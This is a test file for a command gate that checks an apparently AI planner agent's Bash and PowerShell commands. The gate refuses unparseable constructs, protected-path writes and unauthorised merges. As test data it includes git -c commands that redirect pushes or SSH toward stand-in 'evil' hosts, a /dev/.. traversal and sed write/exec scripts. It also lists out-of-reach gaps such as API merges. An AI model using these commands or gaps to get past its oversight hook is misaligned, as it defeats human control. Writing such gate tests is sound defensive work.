/**
 * T-194 r6: P0, the parse gate, and Atlas's rulings on QA 237's open questions, as named rows.
 *
 * P0   a Bash or PowerShell command is checked by P1-P3 only if every word is in the accepted grammar; anything else is
 *      refused as `not statically parseable: <construct>`, and the construct is named.
 * D3, D4, D8, D9, non-merge (Open 4), git -c (Open 5), D17 (the limit text), and QA 237's two surviving mutants.
 * The generated P0 cases are in r6-gate-property.test.ts, and every QA 237 probe is in r6-qa237.test.ts.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach } from "vitest";
import { writeFileSync } from "node:fs";
import { grantPath } from "../../src/planner-hook/grant.js";
import { BASH_WRITE_LIMIT } from "../../src/planner-hook/bash.js";
import { parseGate, sedScriptRefusal } from "../../src/planner-hook/parse-gate.js";
import { makeFixture, type Fixture } from "./r5-fixture.js";
import { BASH_REFUSED, PS_REFUSED, GATE_PREFIX } from "./r6-cases.js";

let fx: Fixture;
beforeAll(() => {
  fx = makeFixture("r6");
});
afterAll(() => fx.dispose());
beforeEach(() => fx.resetGrant());

const NOT_PARSEABLE = "not statically parseable";
const deny = (r: { decision: string }) => expect(r.decision).toBe("deny");
const allow = (r: { decision: string }) => expect(r.decision).toBe("allow");
const NL = "\n";

describe("P0 — Bash: what the hook cannot fully parse is refused, and the construct is named", () => {
  it.each(BASH_REFUSED)("%s", (_name, command, named) => {
    const r = fx.bash(command);
    deny(r);
    expect(r.reason).toContain(GATE_PREFIX);
    expect(r.reason).toContain(named);
  });

  it.each(BASH_REFUSED)("%s: parseGate names the construct without a fixture", (_name, command, named) => {
    const g = parseGate(command, "bash");
    expect(g, command).not.toBeNull();
    expect(g).toContain(named);
  });

  it("the refusal tells the planner how to proceed", () => {
    const r = fx.bash("ls & ls");
    expect(r.reason).toContain("rewrite it in plain words");
    expect(r.reason).toContain("OUT OF REACH");
  });
});

describe("P0 — Bash: the accepted grammar parses, and P1-P3 then decide as in r5", () => {
  it.each([
    "ls -la",
    "git status && git log --oneline -5",
    "git commit -m \"a > b # c\"",
    "git commit -m 'it is $HOME ~ * {x} (y)'",
    "echo 'a # b' > docs/loops/q.md",
    "echo \"a b\" >> docs/loops/q.md",
    "cat < README.md",
    "npm test > /dev/null 2>&1",
    "npm test 2> docs/loops/err.log",
    "echo x &> docs/loops/o.txt",
    "FOO=bar npm test",
    "FOO='a b' ls",
    "env X=1 ls",
    "command git status",
    "nohup node build/cli.js sync",
    "true || ls | cat",
    "sh -c 'echo x > docs/loops/q.md'",
    "bash -c \"git log --oneline\"",
    "sed -n '1,5p' README.md",
    "sed -i 's/a/b/' docs/loops/q.md",
    "sed -i -e 's/a/b/g' -e 's/c/d/' docs/loops/q.md",
    "sed 's/a/b/' README.md",
    "cp docs/loops/a.md docs/loops/b.md",
    "gh pr view 5",
    "gh pr list --label merge",
    "git log --oneline -5 -- docs",
    "grep -n \"x\" README.md",
    "echo a#b",
  ])("`%s` parses and is allowed", (command) => {
    expect(parseGate(command, "bash")).toBeNull();
    allow(fx.bash(command));
  });

  it("a protected target is still denied by P1, with P1's reason and not the gate's", () => {
    for (const command of [
      "echo x > open-brain/src/x.ts",
      "sh -c 'echo x > open-brain/src/x.ts'",
      "env X=1 cp a.ts open-brain/src/x.ts",
      "true && sed -i 's/a/b/' open-brain/src/x.ts",
    ]) {
      const r = fx.bash(command);
      deny(r);
      expect(r.reason, command).not.toContain(GATE_PREFIX);
      expect(r.reason, command).toContain("Authority");
    }
  });

  it("a quoted string is data: it is never read as syntax", () => {
    allow(fx.bash("git commit -m \"a > open-brain/src/x.ts # c\""));
    allow(fx.bash("echo 'cd open-brain && echo x > src/x.ts'"));
  });
});

describe("P0 — PowerShell: unknown parameters, expressions, dynamic code and provider paths are refused", () => {
  it.each(PS_REFUSED)("%s", (_name, command, named) => {
    const r = fx.ps(command);
    deny(r);
    expect(r.reason).toContain(GATE_PREFIX);
    expect(r.reason).toContain(named);
  });

  it.each([
    "Set-Content docs/loops/q.md hi",
    "Set-Content -Path docs/loops/q.md -Value 'a b'",
    "Set-Content -Path:docs/loops/q.md -Value x",
    "Set-Content -Lit docs/loops/q.md -Value x",
    "Add-Content docs/loops/q.md more",
    "New-Item -Type File docs/loops/n.md",
    "New-Item -Path docs -Name n.md -ItemType File",
    "Copy-Item docs/loops/a.md docs/loops/b.md",
    "Copy-Item -Path docs/loops/a.md -Dest docs/loops/b.md",
    "Move-Item docs/loops/a.md docs/loops/b.md",
    "Remove-Item docs/loops/a.md,docs/loops/b.md",
    "Remove-Item -Recurse -Force scratch",
    "Get-Content open-brain/src/cli.ts | Select-Object -First 3",
    "Get-ChildItem open-brain/src -Recurse -Name",
    "Select-String -Pattern x -Path README.md",
    "Write-Output hi > $null",
    "Write-Output hi 2>&1 | Out-Null",
    "Write-Output hi > docs/loops/o.txt",
    "git status; git log --oneline -5",
    "git commit -m 'a > b # c'",
    "gh pr view 5",
    "& gh pr view 5",
    ".\\gh.exe pr list",
    "npm test",
    "node build/cli.js sync",
  ])("`%s` parses and is allowed", (command) => {
    expect(parseGate(command, "powershell")).toBeNull();
    allow(fx.ps(command));
  });

  it("the parameters QA 237 D13 listed are now parsed, and P3 decides on the real target", () => {
    deny(fx.ps("New-Item -Type File open-brain/src/n.ts"));
    deny(fx.ps("New-Item -ItemType File -Path open-brain -Name src/n.ts"));
    deny(fx.ps("Set-Content -Path:open-brain/src/x.ts x"));
    deny(fx.ps("Copy-Item -Dest open-brain/src/b.ts docs/loops/a.md"));
  });

  it("QA 237 survivor qa-p3-comma-list-off: an unquoted and a quoted comma list are several targets", () => {
    deny(fx.ps("Remove-Item C:/qa-tmp/a.txt,open-brain/src/x.ts"));
    deny(fx.ps("Set-Content -Path C:/qa-tmp/a.txt,open-brain/src/x.ts -Value x"));
    deny(fx.ps("Set-Content -Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts' -Value x"));
    allow(fx.ps("Set-Content -Path 'C:/qa-tmp/y.txt','C:/qa-tmp/z.txt' -Value x"));
  });
});

describe("QA 237 survivor qa-p1-install-ignored: install is a writer", () => {
  it("install writes its last operand, or the -t directory", () => {
    deny(fx.bash("install -m 644 a.ts open-brain/src/x.ts"));
    deny(fx.bash("install -t open-brain/src a.ts"));
    deny(fx.bash("install --target-directory=open-brain/src a.ts"));
    allow(fx.bash("install -m 644 a.ts docs/loops/x.ts"));
  });
});

describe("D3 — cp/mv/install -t in every GNU spelling", () => {
  it.each([
    "cp -topen-brain/src a.ts",
    "cp -vt open-brain/src a.ts",
    "cp -vtopen-brain/src a.ts",
    "cp --target open-brain/src a.ts",
    "cp --target-dir=open-brain/src a.ts",
    "cp --t open-brain/src a.ts",
    "mv -t open-brain/src a.ts",
    "mv --target-directory open-brain/src a.ts",
  ])("`%s` is denied", (command) => {
    deny(fx.bash(command));
  });

  it("-t on a harmless directory, and --no-target-directory, are not mistaken for it", () => {
    allow(fx.bash("cp -vt docs/loops a.ts"));
    allow(fx.bash("cp --no-target-directory a.ts docs/loops/b.ts"));
  });
});

describe("D4 — /dev/.. is not the null device", () => {
  it("a path through /dev/.. is resolved, not waved through", () => {
    const rooted = fx.windows ? fx.fwd.replace(/^([A-Za-z]):/, (_m, d: string) => `/${d.toLowerCase()}`) : fx.fwd;
    deny(fx.bash(`echo x > "/dev/..${rooted}/open-brain/src/x.ts"`));
  });
  it("the real devices are still sinks", () => {
    allow(fx.bash("echo x > /dev/null"));
    allow(fx.bash("echo x 2> /dev/null"));
    allow(fx.bash("echo x > /dev/stderr"));
  });
});

describe("D8, D9 — the PR reference", () => {
  it("an unquoted #N is a comment: refused by P0", async () => {
    const r = await fx.merge("Bash", "gh pr merge #2");
    deny(r);
    expect(r.reason).toContain("comment");
    expect(fx.calls).toEqual([]);
    const p = await fx.merge("PowerShell", "gh pr merge #2");
    deny(p);
    expect(p.reason).toContain("comment");
  });

  it("a QUOTED '#1' is PR 1: read, and allowed when docs-only", async () => {
    const r = await fx.merge("Bash", "gh pr merge '#1'");
    allow(r);
    expect(fx.calls.length).toBeGreaterThan(0);
  });

  it("a pull URL of another repository needs a grant and is not read", async () => {
    const r = await fx.merge("Bash", "gh pr merge https://github.com/other/repo/pull/3");
    deny(r);
    expect(r.reason).toContain("another repository needs a grant");
    expect(fx.calls).toEqual([]);
  });

  it("a pull URL of origin is read like a number, in either case", async () => {
    allow(await fx.merge("Bash", "gh pr merge https://github.com/melvenac/Self-Improving-Agent/pull/1"));
    expect(fx.calls.length).toBeGreaterThan(0);
    allow(await fx.merge("Bash", "gh pr merge https://github.com/MELVENAC/self-improving-agent/pull/1"));
  });

  it("a grant for the foreign URL covers exactly that command", async () => {
    const cmd = "gh pr merge https://github.com/other/repo/pull/3";
    writeFileSync(grantPath(fx.repo), JSON.stringify({ command: cmd }), "utf-8");
    allow(await fx.merge("Bash", cmd));
  });
});

describe("Open 4 — a merge is gh's first two positional words, after its global flags, being `pr` `merge`", () => {
  it.each([
    "gh pr comment 5 --body merge",
    "gh pr list --label merge",
    "gh pr edit 5 --title merge",
    "gh pr review 5 --comment -b merge",
    "gh pr view 5 --json state --jq merge",
    "gh issue comment 5 --body 'pr merge'",
    "gh --repo other/x pr checks 1",
  ])("`%s` is not a merge: allowed, nothing read", async (command) => {
    allow(await fx.merge("Bash", command));
    expect(fx.calls).toEqual([]);
  });

  it.each([
    "gh -R other/x pr merge 1",
    "gh --repo other/x pr merge 1",
    "gh --repo=other/x pr merge 1",
    "gh pr merge 1 --body hi",
    "gh GH pr merge 1",
  ])("`%s` is still a merge that needs a grant (or is not a plain gh word)", async (command) => {
    const r = await fx.merge("Bash", command);
    expect(r.decision === "deny" || fx.calls.length === 0).toBe(true);
  });

  it.each(["gh -R other/x pr merge 1", "gh --repo other/x pr merge 1", "GH pr merge 2", "gh.EXE pr merge 2 --admin"])(
    "`%s` is denied",
    async (command) => {
      deny(await fx.merge("Bash", command));
    },
  );
});

describe("Open 5 — git -c <key> with a key that can redefine git needs a grant, whatever the subcommand", () => {
  it.each([
    "git -c alias.x=status status",
    "git -c remote.origin.url=https://github.com/evil/x push origin loop/x",
    "git -c url.https://evil/.insteadOf=https://github.com/ status",
    "git -c include.path=x status",
    "git -c includeIf.gitdir:/x.path=y status",
    "git -c core.sshCommand=evil fetch origin",
    "git -c core.hooksPath=x status",
    "git -c CORE.pager=x log",
    "git --config-env=core.pager=PAGER log",
  ])("`%s` needs a grant", (command) => {
    const r = fx.bash(command);
    deny(r);
    expect(r.reason).toMatch(/D-038|not statically parseable/);
  });

  it.each(["git -c color.ui=false status", "git -c user.name=x log --oneline", "git -c pull.rebase=true fetch origin"])(
    "`%s` is allowed (a harmless key)",
    (command) => {
      allow(fx.bash(command));
    },
  );
});

describe("D17 — the limit text states what is out of reach, and nothing it states is caught", () => {
  it("names the items that are still true", () => {
    for (const phrase of ["at runtime", "symlinks and junctions", "gh api", "not a sandbox", "not statically parseable"]) {
      expect(BASH_WRITE_LIMIT).toContain(phrase);
    }
  });

  it("does not claim as out of reach anything the hook now catches or refuses", () => {
    for (const caught of ["perl -pi", "awk -i", "nested more than", "Rename-Item's second", "eval", "heredoc"]) {
      expect(BASH_WRITE_LIMIT).not.toContain(caught);
    }
  });

  it("every out-of-reach item it names really is allowed (nothing it states is caught)", async () => {
    // a program the command runs: the hook sees only the command line
    allow(fx.bash("node scripts/x.js"));
    allow(fx.bash("npm test"));
    // rm, touch, dd, curl -o, git checkout in Bash
    allow(fx.bash("rm docs/loops/old.md"));
    allow(fx.bash("touch docs/loops/new.md"));
    allow(fx.bash("git checkout --detach origin/master"));
    // a merge through the API
    allow(await fx.merge("Bash", "gh api repos/melvenac/Self-Improving-Agent/pulls/2/merge -X PUT"));
  });

  it("it is carried by the refusal", () => {
    expect(fx.bash("echo x > open-brain/src/cli.ts").reason).toContain("OUT OF REACH");
    expect(fx.bash("ls &").reason).toContain("OUT OF REACH");
  });
});

describe("sedScriptRefusal — the small sed scanner", () => {
  it.each([
    ["s/a/b/", null],
    ["s/a/b/g", null],
    ["s|a|b|", null],
    ["1,5p", null],
    ["$!d", null],
    ["/x/,/y/s/a/b/", null],
    ["y/abc/xyz/", null],
    ["p;p", null],
    ["{p;d}", null],
    ["a\\text", null],
    ["w out.txt", "sed w"],
    ["W out.txt", "sed w"],
    ["s/a/b/w out.txt", "sed w"],
    ["s/a/b/gw out.txt", "sed w"],
    ["s/a/b/e", "sed e"],
    ["e ls", "sed e"],
    ["1e ls", "sed e"],
    ["/x/w o", "sed w"],
    ["p;w o", "sed w"],
    ["s/a/b", "not parseable"],
    ["Z", "not parseable"],
  ])("%s", (script, want) => {
    const r = sedScriptRefusal(script);
    if (want === null) expect(r).toBeNull();
    else expect(r).toContain(want);
  });
});
